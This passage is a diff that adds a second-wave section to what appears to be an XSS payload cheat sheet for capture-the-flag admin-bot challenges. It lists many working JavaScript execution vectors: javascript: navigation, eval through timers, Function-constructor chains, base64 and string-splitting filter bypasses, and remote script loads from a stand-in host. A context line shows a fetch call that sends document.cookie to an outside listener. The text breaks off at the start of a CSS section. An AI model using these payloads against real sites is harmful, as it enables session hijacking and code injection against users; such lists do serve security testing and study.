@@ -680,3 +680,211 @@ lacks a charset header). Mostly a legacy shape — keep one probe.
 The working set for an admin-bot challenge: §1 rows with
 `fetch('//me/?c='+document.cookie)` as the handler — that's the
 whole play when cookies are readable.
+
+---
+
+## 21. The second-wave corpus — deeper variants
+
+The first twenty sections are the high-frequency set. This half
+carries the situational variants — same goals, different filter
+shapes, and the weird-but-real vectors.
+
+### 21.1 The `confirm`/`prompt` alternatives — when `alert` is blocked
+
+```javascript
+confirm(1)                    -- the dialog variant
+prompt(1)                      -- the input dialog
+print()                         -- the print dialog (silent proof —
+                                 opens print UI — visible in headless?)
+console.log('XSS')               -- console only — needs devtools (weak)
+document.title='XSS'             -- title change — silent proof
+document.body.innerHTML='XSS'    -- DOM overwrite — visible in render
+history.pushState(0,'XSS','/x')  -- url-bar change — silent proof
+navigator.sendBeacon('/x','XSS') -- silent — no dialog but net-visible
+```
+
+The strongest silent proofs for a bot: `document.title` change,
+`sendBeacon` to your listener, or the DOM overwrite.
+
+### 21.2 The `location`-family — navigation as code
+
+```javascript
+location='javascript:alert(1)'
+location.href='javascript:alert(1)'
+location.assign('javascript:alert(1)')
+location.replace('javascript:alert(1)')
+window.location='javascript:alert(1)'
+document.location='javascript:alert(1)'
+top.location='javascript:alert(1)'
+parent.location='javascript:alert(1)'
+self.location='javascript:alert(1)'
+frames[0].location='javascript:alert(1)'
+location='data:text/html,<script>alert(1)</script>'
+location='//'+'me.com/x'                -- concat bypass
+location=['javascript:alert(1)'][0]      -- array-wrap
+location={toString:()=>'javascript:alert(1)'}  -- object with toString
+location.hash='javascript:alert(1)'      -- dead — hash doesn't navigate
+location.pathname='javascript:alert(1)'  -- dead — path not scheme
+location.protocol='javascript:'          -- dead — can't change scheme
+```
+
+`location` assignment navigates the page — fires `javascript:` code
+in the target's origin. The `location.hash=`/`.pathname=` variants
+don't navigate — dead ends listed to stop retrying them.
+
+### 21.3 The `setTimeout`/`setInterval`/`requestAnimationFrame` set
+
+```javascript
+setTimeout('alert(1)')                    -- string arg = eval
+setTimeout('alert(1)',0)                  -- explicit delay
+setTimeout('alert(1)',0)                  -- runs once
+setInterval('alert(1)',100)               -- repeating
+setInterval('alert(1)',1)                 -- tight-loop (many fires)
+requestAnimationFrame('alert(1)')         -- raf callback — string?
+   -- no — rAF takes a FUNCTION not a string — dead as eval
+requestAnimationFrame(eval.call(null,'alert(1)'))
+   -- raf + eval — works but contrived
+queueMicrotask('alert(1)')                -- dead — takes function
+Promise.resolve().then('alert(1)')        -- dead — then takes fn
+setImmediate('alert(1)')                  -- IE only
+process.nextTick('alert(1)')              -- node — not browser
+```
+
+`setTimeout`/`setInterval` are the string-eval timers — the others
+take functions not strings.
+
+### 21.4 The `Function`-family — constructor chains
+
+```javascript
+Function('alert(1)')()
+Function('alert(1)')()                     -- direct
+Function('a','b','alert(1)')()              -- multi-arg ctor
+new Function('alert(1)')()
+Function('alert(1)')```)``                  -- template-tag call
+Function`alert(1)`()
+constructor.constructor('alert(1)')()      -- any-obj chain
+''.constructor.constructor('alert(1)')()
+[].constructor.constructor('alert(1)')()
+({}).constructor.constructor('alert(1)')()
+(1).constructor.constructor('alert(1)')()
+true.constructor.constructor('alert(1)')()
+[].filter.constructor('alert(1)')()
+[].find.constructor('alert(1)')()
+[].map.constructor('alert(1)')()
+alert.constructor('alert(1)')()            -- alert is a Function
+eval.constructor('alert(1)')()
+top.constructor('alert(1)')()
+self.constructor('alert(1)')()
+parent.constructor('alert(1)')()
+frames.constructor('alert(1)')()
+contentWindow.constructor('alert(1)')()
+onload.constructor('alert(1)')()           -- a handler's ctor
+(function(){}).constructor('alert(1)')()
+```
+
+Every path reaches `Function` — the universal eval.
+
+### 21.5 The `import()`/`import` family
+
+```javascript
+import('data:text/javascript,alert(1)')     -- data-URI module
+import('//me/x.js')                          -- remote module
+import('https://me/x.js')
+import('javascript:alert(1)')                -- no — import needs a
+                                              real module URL
+s=document.createElement('script');s.src='//me/x.js';document.body.append(s)
+s=document.createElement('script');s.src='data:text/javascript,alert(1)';document.head.append(s)
+```
+
+`import()` is async — `await import(...)` in a handler needs an
+async function; the fire-and-forget form `import('//me/x.js')` runs
+the module anyway (import side-effects execute the script).
+
+### 21.6 The `Worker`/`SharedWorker` paths
+
+```javascript
+new Worker('data:text/javascript,alert(1)')          -- worker context
+new Worker('//me/w.js')
+new Blob(['alert(1)']).then(...)                     -- dead — blob
+   doesn't exec — you need URL.createObjectURL:
+w=new Worker(URL.createObjectURL(new Blob(['alert(1)'])))
+   -- the blob-URL worker — runs in worker context (no DOM)
+new SharedWorker('data:text/javascript,alert(1)')
+```
+
+Workers run in a separate context — no DOM access, no `document.cookie`.
+Useful only for proof-of-exec or off-main-thread compute — the DOM
+exfil needs main-thread code.
+
+### 21.7 The `atob`/`btoa`/`unescape` decode-then-eval set
+
+```javascript
+eval(atob('YWxlcnQoMSk='))                   -- alert(1) decoded
+eval(unescape('%61%6c%65%72%74%28%31%29'))    -- unescape+eval
+eval(decodeURIComponent('alert%281%29'))
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+eval('alert(1)')                              -- already code
+setTimeout(atob('YWxlcnQoMSk='))              -- timer-string decode
+setInterval(atob('YWxlcnQoMSk='),1)
+Function(atob('YWxlcnQoMSk='))()
+eval('al'.concat('ert(1)'))                    -- concat inside eval
+```
+
+`atob`+`eval` is the standard "filtered-keywords" bypass — the code
+is base64, the keywords inside don't match the filter.
+
+### 21.8 The `document.write`/`writeln` vectors — DOM-side
+
+```javascript
+document.write('<img src=x onerror=alert(1)>')
+document.write('<svg onload=alert(1)>')
+document.write('<script>alert(1)</script>')   -- DOES run — doc.write
+                                              evals script tags!
+document.writeln('<img src=x onerror=alert(1)>')
+document.write(unescape('%3Cimg...'))
+```
+
+`document.write` with `<script>` runs — the write parses+evals.
+But only during initial document parse — post-load it rewrites
+the whole page.
+
+### 21.9 The `eval`-alias tricks — eval by another name
+
+```javascript
+eval('alert(1)')                              -- direct
+window.eval('alert(1)')
+top.eval('alert(1)')
+self.eval('alert(1)')
+frames.eval('alert(1)')
+parent.eval('alert(1)')
+window['eval']('alert(1)')
+window['ev'+'al']('alert(1)')
+window[atob('ZXZhbA==')]('alert(1)')          -- b64-decoded name
+this.eval('alert(1)')                          -- global this
+globalThis.eval('alert(1)')
+(0,eval)('alert(1)')                           -- indirect eval
+[eval][0]('alert(1)')                          -- array-extract
+({}).eval?...                                  -- no — eval on obj
+eval.call(null,'alert(1)')                     -- call-form
+eval.apply(null,['alert(1)'])                  -- apply-form
+eval.bind(null)('alert(1)')                    -- bind-form
+x=eval;x('alert(1)')                           -- alias var
+```
+
+Indirect `(0,eval)` runs in global scope — same effect, different
+call shape (some filter regexes miss it).
+
+### 21.10 The `with`/`with`+DOM-scope tricks
+
+```javascript
+with(document)with(body)with(innerHTML)alert(1)
+   -- with-scope traversal — deep access without dots
+with(location)with(hash)alert(slice(1))
+```
+
+Rare and contrived — `with` is strict-mode-forbidden, only useful
+in non-strict inline contexts.
+
+### 21.11 The `<style>`-CSS vectors — no-JS leaks
+
+```html
